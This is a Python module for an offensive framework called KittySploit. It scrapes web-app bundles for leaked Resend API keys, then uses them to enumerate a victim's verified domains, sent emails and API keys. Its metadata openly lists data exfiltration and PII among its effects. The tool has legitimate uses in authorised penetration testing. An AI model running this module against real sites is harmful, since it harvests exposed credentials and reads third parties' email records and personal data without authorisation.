#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Enumerate Resend domains, sent emails, and API keys using leaked re_* keys."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.scanner.http.resend_probe import enumerate_resend
from lib.scanner.http.vibe_secrets_probe import collect_vibe_http_bodies, mask_secret


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "Resend Email API Enumeration",
        "description": (
            "Uses leaked Resend API keys (re_*) to list verified domains, sent emails, "
            "and API keys. Auto-discovers from SPA bundles."
        ),
        "author": ["KittySploit Team"],
        "tags": ["resend", "email", "smtp", "enumeration", "auxiliary", "pii"],
        "modules": ["scanner/http/vibe_stack_secrets_detect"],
        "agent": {
            "risk": "intrusive",
            "effects": ["network_probe", "data_exfiltration"],
            "expected_requests": 4,
            "reversible": True,
            "approval_required": True,
            "produces": ["credentials", "risk_signals"],
            "cost": 1.0,
            "noise": 0.3,
            "value": 1.2,
        },
    }

    api_key = OptString("", "Resend API key (re_…)", False)
    auto_discover = OptBool(True, "Scrape SPA for Resend API keys", False)

    def run(self):
        bodies = collect_vibe_http_bodies(self.http_request) if self._to_bool(self.auto_discover) else []
        homepage = next((t for p, t in bodies if p == "/"), "")

        self._configure_session()
        findings, creds = enumerate_resend(
            self.session,
            homepage,
            verify_ssl=self._to_bool(self.verify_ssl),
            api_key=str(self.api_key or "").strip(),
        )

        ok = [f for f in findings if f.get("ok")]
        if not ok:
            print_error("No Resend API access (set re_ key or enable auto_discover)")
            return False

        for hit in ok:
            print_success(f"Resend {hit.get('kind')}")

        self.set_info(
            severity="critical",
            reason=f"Resend enum: {len(ok)} accessible endpoint(s)",
            findings=findings,
            credentials={k: mask_secret(v) for k, v in creds.items()},
        )
        return True
